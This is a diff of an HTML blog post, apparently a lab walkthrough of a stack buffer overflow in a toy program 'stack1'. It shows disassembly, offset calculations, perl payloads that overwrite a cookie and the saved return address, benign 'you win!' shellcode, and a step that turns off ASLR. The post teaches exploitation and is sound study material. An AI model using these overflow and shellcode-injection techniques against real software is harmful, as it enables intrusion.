- <span class="err">8048438:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="mi">30</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x8048530</span>
- <span class="err">804843</span><span class="nl">f:</span> <span class="nf">e8</span> <span class="mi">08</span> <span class="nv">ff</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804834</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
- <span class="err">8048444:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
- <span class="err">8048447:</span> <span class="err">89</span> <span class="err">04</span> <span class="err">24</span>              <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
- <span class="err">804844</span><span class="nl">a:</span> <span class="nf">e8</span> <span class="nv">dd</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804832</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">gets@plt</span><span class="o">&gt;</span>
- <span class="err">804844</span><span class="nl">f:</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="nv">fc</span>              <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
- <span class="err">8048452:</span> <span class="err">3</span><span class="nf">d</span> <span class="mi">44</span> <span class="mi">43</span> <span class="mi">42</span> <span class="mi">41</span>        <span class="nv">cmp</span>    <span class="nb">eax</span><span class="p">,</span><span class="s">`0x41424344`</span>
- <span class="err">8048457:</span> <span class="err">75</span> <span class="err">0</span><span class="nf">c</span>                 <span class="nv">jne</span>    <span class="mi">8048465</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mh">0x41</span><span class="o">&gt;</span>
- <span class="err">8048459:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="mi">48</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x8048548</span>
- <span class="err">8048460:</span> <span class="nf">e8</span> <span class="nv">f7</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804835</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
- <span class="err">8048465:</span> <span class="nf">c9</span>                    <span class="nv">leave</span>
- <span class="err">8048466:</span> <span class="nf">c3</span>                    <span class="nv">ret</span>
- <span class="err">8048467:</span> <span class="err">90</span>                    <span class="nf">nop</span>
-</code></pre></div>
+<pre><code># objdump -d -Mintel stack1 | grep -A20 main.:
+08048424 &lt;main&gt;:
+ 8048424: 55                    push   ebp
+ 8048425: 89 e5                 mov    ebp,esp
+ 8048427: 83 ec 64              sub    esp,0x64
+ 804842a: 8d 45 fc              lea    eax,[ebp-0x4]
+ 804842d: 89 44 24 08           mov    DWORD PTR [esp+0x8],eax
+ 8048431: 8d 45 ac              lea    eax,[ebp-0x54]
+ 8048434: 89 44 24 04           mov    DWORD PTR [esp+0x4],eax
+ 8048438: c7 04 24 30 85 04 08  mov    DWORD PTR [esp],0x8048530
+ 804843f: e8 08 ff ff ff        call   804834c &lt;printf@plt&gt;
+ 8048444: 8d 45 ac              lea    eax,[ebp-0x54]
+ 8048447: 89 04 24              mov    DWORD PTR [esp],eax
+ 804844a: e8 dd fe ff ff        call   804832c &lt;gets@plt&gt;
+ 804844f: 8b 45 fc              mov    eax,DWORD PTR [ebp-0x4]
+ 8048452: 3d 44 43 42 41        cmp    eax,`0x41424344`
+ 8048457: 75 0c                 jne    8048465 &lt;main+0x41&gt;
+ 8048459: c7 04 24 48 85 04 08  mov    DWORD PTR [esp],0x8048548
+ 8048460: e8 f7 fe ff ff        call   804835c &lt;puts@plt&gt;
+ 8048465: c9                    leave
+ 8048466: c3                    ret
+ 8048467: 90                    nop
+</code></pre>
 
 <p>From here we could proceed to the exploitation phase.</p>
 
@@ -461,23 +461,23 @@ or not:</p>
 <p>For this solution we first need to calculate the offset between <code>buf</code>
 and <code>cookie</code>:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># ./stack1</span>
+<pre><code># ./stack1
 buf: bfad87b4 cookie: bfad8804
 AAAAAAA
 
-<span class="c1"># printf &quot;offset: %d\n&quot; $((`0xbffff554` - `0xbffff504`))</span>
-offset: <span class="m">80</span>
-</code></pre></div>
+# printf "offset: %d\n" $((`0xbffff554` - `0xbffff504`))
+offset: 80
+</code></pre>
 
 <p>As expected, it came out to be 80B. We craft a perl command-line to
 overwrite 80B of data to reach past the <code>buf</code> boundary. Once this is
 done, we&#8217;re pointing at the cookie, which can then be overwritten with
 the desired content:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x80 . &quot;\x44\x43\x42\x41&quot;&#39; | ./stack1</span>
+<pre><code># perl -e 'print "A"x80 . "\x44\x43\x42\x41"' | ./stack1
 buf: bfee2d14 cookie: bfee2d64
 you win!
-</code></pre></div>
+</code></pre>
 
 <p><strong>NOTE</strong>: The test system is a x86 Intel machine that uses <a href="http://isisblogs.poly.edu/2012/05/28/endianness/">little-endian</a> byte ordering. We take this into account and reorder individual bytes to set the <code>cookie</code> with appropriate value.</p>
 
@@ -490,29 +490,29 @@ transfers to stack1&#8217;s <code>.text</code> segment instead of the
 <code>__libc_start_main()</code>. But first we need to find the address of the
 <code>printf</code> statement from <code>stack1</code>&#8217;s assembly code:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A20</span> <span class="nv">main.</span><span class="p">:</span>
-<span class="err">08048424</span> <span class="err">&lt;</span><span class="nf">main</span><span class="o">&gt;</span><span class="p">:</span>
- <span class="err">8048424:</span> <span class="err">55</span>                    <span class="nf">push</span>   <span class="nb">ebp</span>
- <span class="err">8048425:</span> <span class="err">89</span> <span class="nf">e5</span>                 <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
- <span class="err">8048427:</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">64</span>              <span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x64</span>
- <span class="err">804842</span><span class="nl">a:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">fc</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
- <span class="err">804842</span><span class="nl">d:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">08</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
- <span class="err">8048431:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
- <span class="err">8048434:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">04</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
- <span class="err">8048438:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="mi">30</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x8048530</span>
- <span class="err">804843</span><span class="nl">f:</span> <span class="nf">e8</span> <span class="mi">08</span> <span class="nv">ff</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804834</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
- <span class="err">8048444:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
- <span class="err">8048447:</span> <span class="err">89</span> <span class="err">04</span> <span class="err">24</span>              <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
- <span class="err">804844</span><span class="nl">a:</span> <span class="nf">e8</span> <span class="nv">dd</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804832</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">gets@plt</span><span class="o">&gt;</span>
- <span class="err">804844</span><span class="nl">f:</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="nv">fc</span>              <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
- <span class="err">8048452:</span> <span class="err">3</span><span class="nf">d</span> <span class="mi">44</span> <span class="mi">43</span> <span class="mi">42</span> <span class="mi">41</span>        <span class="nv">cmp</span>    <span class="nb">eax</span><span class="p">,</span><span class="s">`0x41424344`</span>
- <span class="err">8048457:</span> <span class="err">75</span> <span class="err">0</span><span class="nf">c</span>                 <span class="nv">jne</span>    <span class="mi">8048465</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mh">0x41</span><span class="o">&gt;</span>
- <span class="err">8048459:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="mi">48</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x8048548</span>
- <span class="err">8048460:</span> <span class="nf">e8</span> <span class="nv">f7</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804835</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
- <span class="err">8048465:</span> <span class="nf">c9</span>                    <span class="nv">leave</span>
- <span class="err">8048466:</span> <span class="nf">c3</span>                    <span class="nv">ret</span>
- <span class="err">8048467:</span> <span class="err">90</span>                    <span class="nf">nop</span>
-</code></pre></div>
+<pre><code># objdump -d -Mintel stack1 | grep -A20 main.:
+08048424 &lt;main&gt;:
+ 8048424: 55                    push   ebp
+ 8048425: 89 e5                 mov    ebp,esp
+ 8048427: 83 ec 64              sub    esp,0x64
+ 804842a: 8d 45 fc              lea    eax,[ebp-0x4]
+ 804842d: 89 44 24 08           mov    DWORD PTR [esp+0x8],eax
+ 8048431: 8d 45 ac              lea    eax,[ebp-0x54]
+ 8048434: 89 44 24 04           mov    DWORD PTR [esp+0x4],eax
+ 8048438: c7 04 24 30 85 04 08  mov    DWORD PTR [esp],0x8048530
+ 804843f: e8 08 ff ff ff        call   804834c &lt;printf@plt&gt;
+ 8048444: 8d 45 ac              lea    eax,[ebp-0x54]
+ 8048447: 89 04 24              mov    DWORD PTR [esp],eax
+ 804844a: e8 dd fe ff ff        call   804832c &lt;gets@plt&gt;
+ 804844f: 8b 45 fc              mov    eax,DWORD PTR [ebp-0x4]
+ 8048452: 3d 44 43 42 41        cmp    eax,`0x41424344`
+ 8048457: 75 0c                 jne    8048465 &lt;main+0x41&gt;
+ 8048459: c7 04 24 48 85 04 08  mov    DWORD PTR [esp],0x8048548
+ 8048460: e8 f7 fe ff ff        call   804835c &lt;puts@plt&gt;
+ 8048465: c9                    leave
+ 8048466: c3                    ret
+ 8048467: 90                    nop
+</code></pre>
 
 <p>The last call instruction prepares the stack for a call to <code>puts</code>.
 That&#8217;s right, the stack is prepared for <code>puts</code> and not <code>printf</code>. This is
@@ -539,11 +539,11 @@ program. As such we could find out the offset of the EIP as well.</p>
 easily calculated. The <code>buf</code> 80B + cookie 4B + saved Frame Pointer 4B =
 88B. This is the offset of EIP from the start of the <code>buf</code> array:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x88 . &quot;\x59\x84\x04\x08&quot;&#39; | ./stack1</span>
+<pre><code># perl -e 'print "A"x88 . "\x59\x84\x04\x08"' | ./stack1
 buf: bfebf464 cookie: bfebf4b4
 you win!
 Segmentation fault
-</code></pre></div>
+</code></pre>
 
 <p>We were able to overwrite EIP and redirect control to a desired
 location. This action helped us to bypass the if condition without
@@ -565,9 +565,9 @@ It tells that one of the mitigation features, <code>NX</code>, is enabled for th
 vulnerable <code>stack1</code> program. This means that when we execute this
 binary, it will have its stack segment marked as non-executable:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># readelf -l stack1 | grep -i gnu_stack</span>
+<pre><code># readelf -l stack1 | grep -i gnu_stack
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
-</code></pre></div>
+</code></pre>
 
 <p>From the above output, stack is marked as <code>RW</code> for the vulnerable
 program. As such, even if we can inject (write) shellcode into <code>buf</code>, we
@@ -583,38 +583,38 @@ then read on and try to think about why this might be happening.</p>
 <p>First we need to design a shellcode that simulates the <code>puts</code> call. I
 came up with the following:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># cat -n printf.s</span>
-     <span class="m">1</span>  <span class="c1"># printf.s</span>
-     <span class="m">2</span>  <span class="c1"># sample program to print &quot;you win!\n&quot; message to stdout</span>
-     <span class="m">3</span>
-     <span class="m">4</span>  .section .text
-     <span class="m">5</span>  .globl _start
-     <span class="m">6</span>
-     <span class="m">7</span>  _start:
-     <span class="m">8</span>    jmp cali
-     <span class="m">9</span>
-    <span class="m">10</span>  init:
-    <span class="m">11</span>    xorl %eax, %eax
-    <span class="m">12</span>    xorl %ebx, %ebx
-    <span class="m">13</span>    xorl %edx, %edx
-    <span class="m">14</span>    mov <span class="nv">$4</span>, %al
-    <span class="m">15</span>    mov <span class="nv">$1</span>, %bl
-    <span class="m">16</span>    popl %ecx
-    <span class="m">17</span>    mov <span class="nv">$9</span>, %dl
-    <span class="m">18</span>    int <span class="nv">$0</span>x80
-    <span class="m">19</span>
-    <span class="m">20</span>    xorl %eax, %eax
-    <span class="m">21</span>    incl %eax
-    <span class="m">22</span>    xorl %ebx, %ebx
-    <span class="m">23</span>    int <span class="nv">$0</span>x80
-    <span class="m">24</span>
-    <span class="m">25</span>  cali:
-    <span class="m">26</span>    call init
-    <span class="m">27</span>
-    <span class="m">28</span>  msg:
-    <span class="m">29</span>    .ascii <span class="s2">&quot;you win!\n&quot;</span>
-    <span class="m">30</span>
-</code></pre></div>
+<pre><code># cat -n printf.s
+     1  # printf.s
+     2  # sample program to print "you win!\n" message to stdout
+     3
+     4  .section .text
+     5  .globl _start
+     6
+     7  _start:
+     8    jmp cali
+     9
+    10  init:
+    11    xorl %eax, %eax
+    12    xorl %ebx, %ebx
+    13    xorl %edx, %edx
+    14    mov $4, %al
+    15    mov $1, %bl
+    16    popl %ecx
+    17    mov $9, %dl
+    18    int $0x80
+    19
+    20    xorl %eax, %eax
+    21    incl %eax
+    22    xorl %ebx, %ebx
+    23    int $0x80
+    24
+    25  cali:
+    26    call init
+    27
+    28  msg:
+    29    .ascii "you win!\n"
+    30
+</code></pre>
 
 <p>The above code uses the standard Linux system calls, <code>write</code> and <code>exit</code>,
 to print the message and cleanly terminate the program. Using the <code>exit</code>
@@ -624,55 +624,55 @@ shellcode writing tricks to remove NULL bytes from our shellcode,
 reducing its size and overcoming the addressing problem. Assemble and
 link the program to create a standalone binary:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># as -o printf.o printf.s</span>
-<span class="c1"># ld -o printf printf.o</span>
-<span class="c1"># ./printf</span>
+<pre><code># as -o printf.o printf.s
+# ld -o printf printf.o
+# ./printf
 you win!
-</code></pre></div>
+</code></pre>
 
 <p>Here is the objdump for the resultant <code>printf</code> program:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">printf</span>
+<pre><code># objdump -d -Mintel printf
 
-<span class="nl">printf:</span>     <span class="nf">file</span> <span class="nv">format</span> <span class="nv">elf32</span><span class="o">-</span><span class="nv">i386</span>
+printf:     file format elf32-i386
 
-<span class="nf">Disassembly</span> <span class="nv">of</span> <span class="nv">section</span> <span class="nv">.text</span><span class="p">:</span>
+Disassembly of section .text:
 
-<span class="err">08048054</span> <span class="err">&lt;</span><span class="nf">_start</span><span class="o">&gt;</span><span class="p">:</span>
- <span class="err">8048054:</span> <span class="nf">eb</span> <span class="mi">16</span>                 <span class="nv">jmp</span>    <span class="mi">804806</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">cali</span><span class="o">&gt;</span>
+08048054 &lt;_start&gt;:
+ 8048054: eb 16                 jmp    804806c &lt;cali&gt;
 
-<span class="err">08048056</span> <span class="err">&lt;</span><span class="nf">init</span><span class="o">&gt;</span><span class="p">:</span>
- <span class="err">8048056:</span> <span class="err">31</span> <span class="nf">c0</span>                 <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
- <span class="err">8048058:</span> <span class="err">31</span> <span class="kd">db</span>                 <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
- <span class="err">804805</span><span class="nl">a:</span> <span class="err">31</span> <span class="nf">d2</span>                 <span class="nv">xor</span>    <span class="nb">edx</span><span class="p">,</span><span class="nb">edx</span>
- <span class="err">804805</span><span class="nl">c:</span> <span class="nf">b0</span> <span class="mi">04</span>                 <span class="nv">mov</span>    <span class="nb">al</span><span class="p">,</span><span class="mh">0x4</span>
- <span class="err">804805</span><span class="nl">e:</span> <span class="nf">b3</span> <span class="mi">01</span>                 <span class="nv">mov</span>    <span class="nb">bl</span><span class="p">,</span><span class="mh">0x1</span>
- <span class="err">8048060:</span> <span class="err">59</span>                    <span class="nf">pop</span>    <span class="nb">ecx</span>
- <span class="err">8048061:</span> <span class="nf">b2</span> <span class="mi">09</span>                 <span class="nv">mov</span>    <span class="nb">dl</span><span class="p">,</span><span class="mh">0x9</span>
- <span class="err">8048063:</span> <span class="nf">cd</span> <span class="mi">80</span>                 <span class="nv">int</span>    <span class="mh">0x80</span>
- <span class="err">8048065:</span> <span class="err">31</span> <span class="nf">c0</span>                 <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
- <span class="err">8048067:</span> <span class="err">40</span>                    <span class="nf">inc</span>    <span class="nb">eax</span>
- <span class="err">8048068:</span> <span class="err">31</span> <span class="kd">db</span>                 <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
- <span class="err">804806</span><span class="nl">a:</span> <span class="nf">cd</span> <span class="mi">80</span>                 <span class="nv">int</span>    <span class="mh">0x80</span>
+08048056 &lt;init&gt;:
+ 8048056: 31 c0                 xor    eax,eax
+ 8048058: 31 db                 xor    ebx,ebx
+ 804805a: 31 d2                 xor    edx,edx
+ 804805c: b0 04                 mov    al,0x4
+ 804805e: b3 01                 mov    bl,0x1
+ 8048060: 59                    pop    ecx
+ 8048061: b2 09                 mov    dl,0x9
+ 8048063: cd 80                 int    0x80
+ 8048065: 31 c0                 xor    eax,eax
+ 8048067: 40                    inc    eax
+ 8048068: 31 db                 xor    ebx,ebx
+ 804806a: cd 80                 int    0x80
 
-<span class="err">0804806</span><span class="nf">c</span> <span class="o">&lt;</span><span class="nv">cali</span><span class="o">&gt;</span><span class="p">:</span>
- <span class="err">804806</span><span class="nl">c:</span> <span class="nf">e8</span> <span class="nv">e5</span> <span class="nv">ff</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">8048056</span> <span class="o">&lt;</span><span class="nv">init</span><span class="o">&gt;</span>
+0804806c &lt;cali&gt;:
+ 804806c: e8 e5 ff ff ff        call   8048056 &lt;init&gt;
 
-<span class="err">08048071</span> <span class="err">&lt;</span><span class="nf">msg</span><span class="o">&gt;</span><span class="p">:</span>
- <span class="err">8048071:</span> <span class="err">79</span> <span class="err">6</span><span class="nf">f</span>                 <span class="nv">jns</span>    <span class="mi">80480</span><span class="nv">e2</span> <span class="o">&lt;</span><span class="nv">msg</span><span class="o">+</span><span class="mh">0x71</span><span class="o">&gt;</span>
- <span class="err">8048073:</span> <span class="err">75</span> <span class="err">20</span>                 <span class="nf">jne</span>    <span class="mi">8048095</span> <span class="o">&lt;</span><span class="nv">msg</span><span class="o">+</span><span class="mh">0x24</span><span class="o">&gt;</span>
- <span class="err">8048075:</span> <span class="err">77</span> <span class="err">69</span>                 <span class="nf">ja</span>     <span class="mi">80480</span><span class="nv">e0</span> <span class="o">&lt;</span><span class="nv">msg</span><span class="o">+</span><span class="mh">0x6f</span><span class="o">&gt;</span>
- <span class="err">8048077:</span> <span class="err">6</span><span class="nf">e</span>                    <span class="nv">outs</span>   <span class="nb">dx</span><span class="p">,</span><span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="nb">ds</span><span class="p">:[</span><span class="nb">esi</span><span class="p">]</span>
- <span class="err">8048078:</span> <span class="err">21</span> <span class="err">0</span><span class="nf">a</span>                 <span class="nv">and</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">edx</span><span class="p">],</span><span class="nb">ecx</span>
-</code></pre></div>
+08048071 &lt;msg&gt;:
+ 8048071: 79 6f                 jns    80480e2 &lt;msg+0x71&gt;
+ 8048073: 75 20                 jne    8048095 &lt;msg+0x24&gt;
+ 8048075: 77 69                 ja     80480e0 &lt;msg+0x6f&gt;
+ 8048077: 6e                    outs   dx,BYTE PTR ds:[esi]
+ 8048078: 21 0a                 and    DWORD PTR [edx],ecx
+</code></pre>
 
 <p>Extract opcodes to create the required shellcode and calculate its size:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot;&#39; &gt;shellcode.bin</span>
-<span class="c1">#</span>
-<span class="c1"># ls -lh shellcode.bin</span>
--rw-r--r-- <span class="m">1</span> seed seed <span class="m">38</span> <span class="m">2012</span>-08-27 <span class="m">02</span>:41 shellcode.bin
-</code></pre></div>
+<pre><code># perl -e 'print "\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a"' &gt;shellcode.bin
+#
+# ls -lh shellcode.bin
+-rw-r--r-- 1 seed seed 38 2012-08-27 02:41 shellcode.bin
+</code></pre>
 
 <p>Now we are ready with the shellcode that simulates the <code>puts</code> call. Once
 we inject it, we would need the address of the buffer where this
@@ -684,40 +684,40 @@ exploit. Why is this so? If you had noticed earlier, both <code>buf</code> and
 <code>cookie</code>, although adjacent and aligned as expected, had different
 address on each invocation:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># ./stack1</span>
+<pre><code># ./stack1
 buf: bfc21614 cookie: bfc21664
 AAAA
-<span class="c1">#</span>
-<span class="c1"># ./stack1</span>
+#
+# ./stack1
 buf: bf9ad354 cookie: bf9ad3a4
 AAAA
-<span class="c1">#</span>
-<span class="c1"># ./stack1</span>
+#
+# ./stack1
 buf: bfd7c3d4 cookie: bfd7c424
 AAAA
-<span class="c1">#</span>
-</code></pre></div>
+#
+</code></pre>
 
 <p>You would have already guessed by now. It is due to the <code>ASLR</code>
 mitigation feature that is active on the test system:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># cat /proc/sys/kernel/randomize_va_space</span>
-<span class="m">2</span>
-<span class="c1">#</span>
-<span class="c1"># ./checksec.sh --proc init</span>
-* System-wide ASLR <span class="o">(</span>kernel.randomize_va_space<span class="o">)</span>: On <span class="o">(</span>Setting: <span class="m">2</span><span class="o">)</span>
+<pre><code># cat /proc/sys/kernel/randomize_va_space
+2
+#
+# ./checksec.sh --proc init
+* System-wide ASLR (kernel.randomize_va_space): On (Setting: 2)
 
   Description - Make the addresses of mmap base, heap, stack and VDSO page randomized.
   This, among other things, implies that shared libraries will be loaded to random
-  addresses. Also <span class="k">for</span> PIE-linked binaries, the location of code start is randomized.
+  addresses. Also for PIE-linked binaries, the location of code start is randomized.
 
-  See the kernel file <span class="s1">&#39;Documentation/sysctl/kernel.txt&#39;</span> <span class="k">for</span> more details.
+  See the kernel file 'Documentation/sysctl/kernel.txt' for more details.
 
 * Does the CPU support NX: Yes
 
          COMMAND    PID RELRO             STACK CANARY           NX/PaX        PIE
-            init      <span class="m">1</span> Full RELRO        Canary found           NX enabled    PIE enabled
-</code></pre></div>
+            init      1 Full RELRO        Canary found           NX enabled    PIE enabled
+</code></pre>
 
 <p>On systems that support <a href="https://wiki.ubuntu.com/Security/Features#brk_ASLR">brk</a> <a href="https://wiki.ubuntu.com/Security/Features#Address_Space_Layout_Randomisation_.28ASLR.29">ASLR</a>, the
 <code>/proc/sys/kernel/randomize_va_space</code> file stores a value of 2. On other
@@ -725,23 +725,23 @@ systems it stores a value of 1 by default to indicate the presence of
 vanilla <code>ASLR</code>. Modifying this file with a value of 0 will immediately
 turn off this feature for all newly spawned processes:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># cat /proc/sys/kernel/randomize_va_space</span>
-<span class="m">2</span>
-<span class="c1">#</span>
-<span class="c1"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span>
-<span class="c1">#</span>
-<span class="c1"># ./stack1</span>
+<pre><code># cat /proc/sys/kernel/randomize_va_space
+2
+#
+# echo 0 &gt; /proc/sys/kernel/randomize_va_space
+#
+# ./stack1
 buf: bffff4d4 cookie: bffff524
 AAAA
-<span class="c1">#</span>
-<span class="c1"># ./stack1</span>
+#
+# ./stack1
 buf: bffff4d4 cookie: bffff524
 AAAA
-<span class="c1">#</span>
-<span class="c1"># ./stack1</span>
+#
+# ./stack1
 buf: bffff4d4 cookie: bffff524
 AAAA
-</code></pre></div>
+</code></pre>
 
 <p>For all the 3 invocations of <code>stack1</code> program, the locations for <code>buf</code>
 (<code>0xbffff4d4</code>) and <code>cookie</code> (<code>0xbffff524</code>) remains constant. Since the <code>buf</code>
@@ -757,13 +757,13 @@ command-line to inject our shellcode at the location where this correct
 address could be overwritten. However, we were not able to get the
 shellcode executed:</p>
 
-<div class="codehilite"><pre><span></span><code>./stack1
+<pre><code>./stack1
 buf: bffff4d4 cookie: bffff524
 AAAA
-<span class="c1">#</span>
-<span class="c1"># perl -e &#39;print &quot;\x90&quot;x50 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
+#
+# perl -e 'print "\x90"x50 . "\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a" . "\xd4\xf4\xff\xbf"' | ./stack1
 buf: bffff4d4 cookie: bffff524
-</code></pre></div>
+</code></pre>
 
 <p>Sadly, it did not work. The offset calculation was correct, address for
 EIP overwrite also points to our shellcode, and we actually have a
@@ -772,12 +772,12 @@ What could have gone wrong? A GDB analysis could help but this specific
 issue could be debugged without using it. Have a look at the shellcode
 once again:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># hexdump -C shellcode.bin</span>
-<span class="m">00000000</span>  eb <span class="m">16</span> <span class="m">31</span> c0 <span class="m">31</span> db <span class="m">31</span> d2  b0 <span class="m">04</span> b3 <span class="m">01</span> <span class="m">59</span> b2 <span class="m">09</span> <span class="nb">cd</span>  <span class="p">|</span>..1.1.1.....Y...<span class="p">|</span>
